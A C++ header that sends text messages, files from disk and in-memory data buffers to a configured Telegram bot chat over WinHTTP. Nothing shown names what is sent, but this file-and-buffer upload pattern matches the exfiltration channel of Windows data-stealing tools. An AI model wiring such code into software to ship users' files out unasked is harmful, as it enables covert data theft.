#pragma once


#include "config.hpp"
#include "util.hpp"
#include <winhttp.h>
#include <fstream>

namespace telegram {

inline bool send_message(const std::string& text) {
    if (text.empty()) return false;


    const size_t MAX_CHUNK = 4000;
    if (text.size() > MAX_CHUNK) {
        bool ok = true;
        for (size_t i = 0; i < text.size(); i += MAX_CHUNK) {
            ok &= send_message(text.substr(i, MAX_CHUNK));
            Sleep(400);
        }
        return ok;
    }

    std::wstring token = TELEGRAM_TOKEN;
    std::wstring path = L"/bot" + token + L"/sendMessage";


    nlohmann::json body;
    body["chat_id"] = ws2s(std::wstring(TELEGRAM_CHAT_ID));
    body["text"] = text;
    std::string json_body = body.dump();

    HINTERNET hSession = WinHttpOpen(L"Bot/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org",
                                        INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(), NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    std::wstring headers = L"Content-Type: application/json\r\n";
    BOOL ok = WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.size(),
        (LPVOID)json_body.data(), (DWORD)json_body.size(), (DWORD)json_body.size(), 0);
    if (ok) ok = WinHttpReceiveResponse(hRequest, NULL);

    DWORD statusCode = 0;
    DWORD dwSize = sizeof(statusCode);
    if (ok) WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                                NULL, &statusCode, &dwSize, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return (statusCode == 200);
}

inline bool upload_file(const std::wstring& filePath) {
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) return false;
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<char> buffer((size_t)size);
    if (!file.read(buffer.data(), size)) return false;
    file.close();

    std::wstring fileName = filePath;
    size_t pos = fileName.find_last_of(L"/\\");
    if (pos != std::wstring::npos) fileName = fileName.substr(pos + 1);

    std::string chat_id_utf8 = ws2s(std::wstring(TELEGRAM_CHAT_ID));
    std::string fileName_utf8 = ws2s(fileName);
    std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";

    std::string content =
        "--" + boundary + "\r\n"
        "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
        chat_id_utf8 + "\r\n"
        "--" + boundary + "\r\n"
        "Content-Disposition: form-data; name=\"document\"; filename=\"" +
        fileName_utf8 + "\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n";

    std::vector<char> postData(content.begin(), content.end());
    postData.insert(postData.end(), buffer.begin(), buffer.end());
    std::string footer = "\r\n--" + boundary + "--\r\n";
    postData.insert(postData.end(), footer.begin(), footer.end());

    std::wstring token = TELEGRAM_TOKEN;

    HINTERNET hSession = WinHttpOpen(L"Bot/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org",
                                        INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    std::wstring path = L"/bot" + token + L"/sendDocument";
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(), NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    std::wstring headers = L"Content-Type: multipart/form-data; boundary=" +
        s2ws(boundary) + L"\r\n";

    BOOL ok = WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.size(),
        (LPVOID)postData.data(), (DWORD)postData.size(), (DWORD)postData.size(), 0);
    if (ok) ok = WinHttpReceiveResponse(hRequest, NULL);

    DWORD statusCode = 0;
    DWORD dwSize = sizeof(statusCode);
    if (ok) WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                                NULL, &statusCode, &dwSize, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return (statusCode == 200);
}

inline bool upload_data(const std::vector<char>& data, const std::string& filename) {
    if (data.empty()) return false;

    std::string chat_id_utf8 = ws2s(std::wstring(TELEGRAM_CHAT_ID));
    std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";

    std::string content =
        "--" + boundary + "\r\n"
        "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
        chat_id_utf8 + "\r\n"
        "--" + boundary + "\r\n"
        "Content-Disposition: form-data; name=\"document\"; filename=\"" +
        filename + "\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n";

    std::vector<char> postData(content.begin(), content.end());
    postData.insert(postData.end(), data.begin(), data.end());
    std::string footer = "\r\n--" + boundary + "--\r\n";
    postData.insert(postData.end(), footer.begin(), footer.end());

    std::wstring token = TELEGRAM_TOKEN;

    HINTERNET hSession = WinHttpOpen(L"Bot/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org",
                                        INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    std::wstring path = L"/bot" + token + L"/sendDocument";
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(), NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    std::wstring headers = L"Content-Type: multipart/form-data; boundary=" +
        s2ws(boundary) + L"\r\n";

    BOOL ok = WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.size(),
        (LPVOID)postData.data(), (DWORD)postData.size(), (DWORD)postData.size(), 0);
    if (ok) ok = WinHttpReceiveResponse(hRequest, NULL);

    DWORD statusCode = 0;
    DWORD dwSize = sizeof(statusCode);
    if (ok) WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                                NULL, &statusCode, &dwSize, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return (statusCode == 200);
}

}
